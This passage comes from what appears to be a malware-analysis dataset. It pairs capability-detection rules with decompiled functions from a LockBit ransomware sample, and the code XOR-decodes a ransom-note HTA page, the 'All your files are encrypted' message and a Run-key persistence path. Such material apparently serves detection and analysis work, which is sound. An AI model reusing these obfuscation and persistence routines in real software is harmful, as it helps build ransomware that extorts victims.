str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._44_4_ ^ 0x46;\n    *(param_1 + 0x20) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._44_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x82) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._48_4_ ^ 0x46;\n    *(param_1 + 0x21) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._48_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x86) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._52_4_ ^ 0x46;\n    *(param_1 + 0x22) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._52_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x8a) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._56_4_ ^ 0x46;\n    *(param_1 + 0x23) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._56_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x8e) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._60_4_ ^ 0x46;\n    *(param_1 + 0x24) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._60_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x92) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._64_4_ ^ 0x46;\n    *(param_1 + 0x25) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._64_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x96) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._68_4_ ^ 0x46;\n    *(param_1 + 0x26) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._68_4_ >> 0x10 ^ 0x46;\n    *(param_1 + 0x9a) =\n         str._html__head__meta_http_equiv_Content_Type__content_text_html__charsetutf_8___meta_http_equiv_x_ua_compatible__content_ie9___title_LockBit__title__hta:application_idLockBit_applicationNameLockBit_iconexplorer.exe_selectionno_scrollno_contextmenuno_innerBorderno_windowStatemaximize_minimizeButtonno_singleInstanceyes_sysMenuno____link_rel_stylesheet__href_public_css_test.css___meta_name_viewport__content_widthdevice_width__initial_scale1.0___style_htmlfont_size:100_bodyposition:relative_border:0_font_family:Arial_padding:1__0_0_0_margin:0_width:100vw_height:100vh_overflow:hiddenfont_size:1rem.g1content:___position:absolute_left:0_top:50__transform:translateY__50___height:368px_width:150px_z_index:_1.g2z_index:_1_content:___position:absolute_right:0_top:50__transform:translateY__50___height:368px_width:150px.containerwidth:90__margin:auto.container_imgmax_width:100_.htmargin_bottom:1__position:relative_padding_left:16px_font_weight:900_font_size:1rem_line_height:100__letter_spacing:.05em_text_transform:uppercase_color:dedede.hbmargin_bottom:1_.hb_imgwidth:850px_max_width:100_.himargin_bottom:1rem_background:fcfcfd_border:1px_dashed_f71b3a_box_sizing:border_box_b\n         ._72_4_ ^ 0x46;\n    *(param_1 + 0x27) = 0;\n    return param_1;\n}\n",
        "token_count": 13124
    },
    "00401940": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00401940(uint *param_1)\n\n{\n    *param_1 = 0x560073;\n    param_1[1] = 0x2f0000;\n    param_1[2] = 0x1c003f;\n    param_1[3] = 0x180010;\n    param_1[4] = 0x1a0031;\n    param_1[5] = 0x5e0007;\n    param_1[6] = 0x1c001d;\n    param_1[7] = 0x160007;\n    param_1[8] = 0x1b005d;\n    param_1[9] = 0x120007;\n    *(param_1 + 10) = 0x73;\n    *(param_1 + 0x2a) = str.open._0_4_ ^ 0x73;\n    *(param_1 + 0xb) = str.open._0_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x2e) = str.open._4_4_ ^ 0x73;\n    *(param_1 + 0xc) = str.open._4_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x32) = *0x42222c ^ 0x73;\n    *(param_1 + 0xd) = *0x42222c >> 0x10 ^ 0x73;\n    *(param_1 + 0x36) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._0_4_ ^ 0x73;\n    *(param_1 + 0xe) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._0_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x3a) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._4_4_ ^ 0x73;\n    *(param_1 + 0xf) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._4_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x3e) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._8_4_ ^ 0x73;\n    *(param_1 + 0x10) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._8_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x42) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._12_4_ ^ 0x73;\n    *(param_1 + 0x11) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._12_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x46) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._16_4_ ^ 0x73;\n    *(param_1 + 0x12) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._16_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x4a) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._20_4_ ^ 0x73;\n    *(param_1 + 0x13) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._20_4_ >> 0x10 ^ 0x73;\n    *(param_1 + 0x4e) =\n         str.All_your_files_are_encrypted_by_LockBit_r_nFor_more_information_see_Restore_My_Files.txt_that_is_located_in_every_encrypted_folder\n         ._24_4_ ^ 0x73;\n    *(param_1 + 0x14) = 0;\n    return param_1;\n}\n",
        "token_count": 1205
    },
    "00401a90": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "manually build AES constants/65409eccd04443b5b13c632c5ab643ce",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00401a90(uint *param_1)\n\n{\n    *param_1 = 0x2e2e0342;\n    param_1[1] = 0x372d3b62;\n    param_1[2] = 0x2b246230;\n    param_1[3] = 0x6231272e;\n    param_1[4] = 0x62273023;\n    param_1[5] = 0x30212c27;\n    param_1[6] = 0x2736323b;\n    param_1[7] = 0x3b206226;\n    param_1[8] = 0x212d0e62;\n    param_1[9] = 0x362b0029;\n    param_1[10] = 0x2d04484f;\n    param_1[0xb] = 0x2d2f6230;\n    param_1[0xc] = 0x2b622730;\n    param_1[0xd] = 0x302d242c;\n    param_1[0xe] = 0x2b36232f;\n    param_1[0xf] = 0x31622c2d;\n    param_1[0x10] = 0x10622727;\n    param_1[0x11] = 0x2d363127;\n    param_1[0x12] = 0xf6f2730;\n    param_1[0x13] = 0x2b046f3b;\n    param_1[0x14] = 0x6c31272e;\n    param_1[0x15] = 0x62363a36;\n    param_1[0x16] = 0x36232a36;\n    param_1[0x17] = 0x62312b62;\n    *(param_1 + 0x18) = 0x2e;\n    *(param_1 + 0x61) = *param_1 ^ 0x6f;\n    *(param_1 + 0x62) = *param_1 ^ 99;\n    *(param_1 + 99) = *param_1 ^ 0x61;\n    *(param_1 + 0x19) = *param_1 ^ 0x74;\n    *(param_1 + 0x65) = *param_1 ^ 0x65;\n    *(param_1 + 0x66) = *param_1 ^ 100;\n    *(param_1 + 0x67) = *param_1 ^ 0x20;\n    *(param_1 + 0x1a) = *param_1 ^ 0x69;\n    *(param_1 + 0x69) = *param_1 ^ 0x6e;\n    *(param_1 + 0x6a) = *param_1 ^ 0x20;\n    *(param_1 + 0x6b) = *param_1 ^ 0x65;\n    *(param_1 + 0x1b) = *param_1 ^ 0x76;\n    *(param_1 + 0x6d) = *param_1 ^ 0x65;\n    *(param_1 + 0x6e) = *param_1 ^ 0x72;\n    *(param_1 + 0x6f) = *param_1 ^ 0x79;\n    *(param_1 + 0x1c) = *param_1 ^ 0x20;\n    *(param_1 + 0x71) = *param_1 ^ 0x65;\n    *(param_1 + 0x72) = *param_1 ^ 0x6e;\n    *(param_1 + 0x73) = *param_1 ^ 99;\n    *(param_1 + 0x1d) = *param_1 ^ 0x72;\n    *(param_1 + 0x75) = *param_1 ^ 0x79;\n    *(param_1 + 0x76) = *param_1 ^ 0x70;\n    *(param_1 + 0x77) = *param_1 ^ 0x74;\n    *(param_1 + 0x1e) = *param_1 ^ 0x65;\n    *(param_1 + 0x79) = *param_1 ^ 100;\n    *(param_1 + 0x7a) = *param_1 ^ 0x20;\n    *(param_1 + 0x7b) = *param_1 ^ 0x66;\n    *(param_1 + 0x1f) = *param_1 ^ 0x6f;\n    *(param_1 + 0x7d) = *param_1 ^ 0x6c;\n    *(param_1 + 0x7e) = *param_1 ^ 100;\n    *(param_1 + 0x7f) = *param_1 ^ 0x65;\n    *(param_1 + 0x20) = *param_1 ^ 0x72;\n    *(param_1 + 0x81) = 0;\n    return param_1;\n}\n",
        "token_count": 1185
    },
    "004024c0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004024c0(uint *param_1)\n\n{\n    *param_1 = 0x270007;\n    param_1[1] = 0x440028;\n    param_1[2] = 0x770027;\n    param_1[3] = 0x69006e;\n    param_1[4] = 0x270060;\n    param_1[5] = 0x350036;\n    param_1[6] = 0x290030;\n    param_1[7] = 0x290037;\n    param_1[8] = 0x290037;\n    param_1[9] = 0x270030;\n    param_1[10] = 0x69002a;\n    param_1[0xb] = 0x340027;\n    param_1[0xc] = 0x390027;\n    param_1[0xd] = 0x490027;\n    param_1[0xe] = 0x6b0072;\n    param_1[0xf] = 0x210027;\n    param_1[0x10] = 0x610027;\n    param_1[0x11] = 0x720074;\n    param_1[0x12] = 0x6e0073;\n    param_1[0x13] = 0x27006b;\n    param_1[0x14] = 0x6e0061;\n    param_1[0x15] = 0x62006b;\n    param_1[0x16] = 0x740027;\n    param_1[0x17] = 0x730062;\n    param_1[0x18] = 0x62005d;\n    param_1[0x19] = 0x680075;\n    param_1[0x1a] = 0x660043;\n    param_1[0x1b] = 0x660073;\n    param_1[0x1c] = 0x680027;\n    param_1[0x1d] = 0x610061;\n    param_1[0x1e] = 0x620074;\n    param_1[0x1f] = 0x3a0073;\n    param_1[0x20] = 0x270037;\n    param_1[0x21] = 0x62006b;\n    param_1[0x22] = 0x600069;\n    param_1[0x23] = 0x6f0073;\n    param_1[0x24] = 0x32003a;\n    param_1[0x25] = 0x330035;\n    param_1[0x26] = 0x3f0035;\n    param_1[0x27] = 0x27003f;\n    param_1[0x28] = 0x220025;\n    param_1[0x29] = 0x250074;\n    param_1[0x2a] = 0x210027;\n    param_1[0x2b] = 0x430027;\n    param_1[0x2c] = 0x6b0062;\n    param_1[0x2d] = 0x280027;\n    param_1[0x2e] = 0x270061;\n    param_1[0x2f] = 0x760028;\n    *(param_1 + 0x30) = 0x27;\n    *(param_1 + 0xc2) = *param_1 ^ 0x22;\n    *(param_1 + 0x31) = *param_1 ^ 0x25;\n    *(param_1 + 0xc6) = *param_1 ^ 0x73;\n    *(param_1 + 0x32) = *param_1 ^ 0x22;\n    *(param_1 + 0xca) = *param_1;\n    *(param_1 + 0x33) = *param_1 ^ *0x4224aa;\n    *(param_1 + 0xce) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._0_2_;\n    *(param_1 + 0x34) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._2_2_;\n    *(param_1 + 0xd2) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._4_2_;\n    *(param_1 + 0x35) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._6_2_;\n    *(param_1 + 0xd6) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._8_2_;\n    *(param_1 + 0x36) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._10_2_;\n    *(param_1 + 0xda) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._12_2_;\n    *(param_1 + 0x37) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._14_2_;\n    *(param_1 + 0xde) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._16_2_;\n    *(param_1 + 0x38) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._18_2_;\n    *(param_1 + 0xe2) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._20_2_;\n    *(param_1 + 0x39) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._22_2_;\n    *(param_1 + 0xe6) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._24_2_;\n    *(param_1 + 0x3a) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._26_2_;\n    *(param_1 + 0xea) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._28_2_;\n    *(param_1 + 0x3b) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._30_2_;\n    *(param_1 + 0xee) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._32_2_;\n    *(param_1 + 0x3c) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._34_2_;\n    *(param_1 + 0xf2) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._36_2_;\n    *(param_1 + 0x3d) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._38_2_;\n    *(param_1 + 0xf6) = *param_1 ^ str.SOFTWAREMicrosoftWindowsCurrentVersionRun._40_2_;\n    